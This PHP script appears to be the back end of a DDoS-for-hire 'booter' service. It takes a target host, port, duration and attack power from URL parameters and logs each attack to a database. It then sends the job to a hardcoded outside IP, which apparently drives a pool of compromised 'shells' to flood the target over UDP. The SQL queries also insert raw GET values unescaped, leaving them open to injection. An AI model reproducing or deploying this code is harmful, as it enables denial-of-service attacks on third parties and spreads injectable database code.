<?php

include_once("login/includes/db.php"); 					//Include the database connection
$query=mysql_query("SELECT * FROM stats");
$row=mysql_fetch_array($query, MYSQL_ASSOC);
		$timenow = time();
 		$host = $_GET['host'];  							//Set the host GET to an easier to use variable
		$user = $_GET['user'];  							//Set the HWID GET to an easier to use variable
		$port = $_GET['port'];  							//Set the port GET to an easier to use variable
		$shells = $_GET['power'];
		$ip = $_GET['ip'];									//Get the users IP, for logging
		$time = $_GET['time'];								//Set the time GET to an easier to use variable

if ($_SERVER['REMOTE_ADDR'] == $_SERVER['SERVER_ADDR']) {
		 
$query=mysql_query("SELECT * FROM stats");					//Prepare the query for configuration
$row=mysql_fetch_array($query, MYSQL_ASSOC);				//Fetch the rows
$dbpercentage = $row['percentage'];							//Get the master shell use percentage
 		
$fullcurl = "?act=phptools&host=".$host."&time=".$time."&type=udp&port=".$port;  //GET data for the cURL handler
$sql = "SELECT * FROM badips WHERE ip='$host'";
$query = mysql_query($sql);
$num = mysql_num_rows($query);
		if ($num == 0) {
if((isset($_GET['host'])) and (isset($_GET['user'])) and (isset($_GET['port'])) and (isset($_GET['time']))){ 		//If sending GET data

	ignore_user_abort(TRUE); 						//Let the page be exited and the script continue
			
	$query_log = "INSERT INTO logs (user, ip, target, duration, shells, time) VALUE ('$user', '$ip', '$host', '$time', '$shells', '$timenow' )";
	mysql_query($query_log) or die(mysql_error());			//Log the attack

	$shellamount1 = file_get_contents("http://89.248.166.141/boot.php?perc=" . ($dbpercentage * ($shells / 100)) . "&ip=" . $host . "&port=" . $port . "&time=" . $time, true);
	//mysql_query("UPDATE shells SET url='". $shellamount1 . "' WHERE status='404'");
	
			echo "success";									//Successful. Tell the client to start the timer
		}else
		{
		mysql_query("INSERT INTO badlogs (user, ip, target, reason, time) VALUE ('$user', '$ip', '$host', 'Wrong GET info', '$timenow' )"); 
		}
		}else{
			mysql_query("INSERT INTO badlogs (user, ip, target, reason, time) VALUE ('$user', '$ip', '$host', 'Blacklisted IP', '$timenow' )"); 
			echo 'BLACKLISTED IP';
		}
		}else{
			mysql_query("INSERT INTO badlogs (user, ip, target, reason, time) VALUE ('$user', '$scriptip', '$host', 'NOT THE SCRIPT', '$timenow' )"); 
			echo 'not the script';
		}		
		
		?>
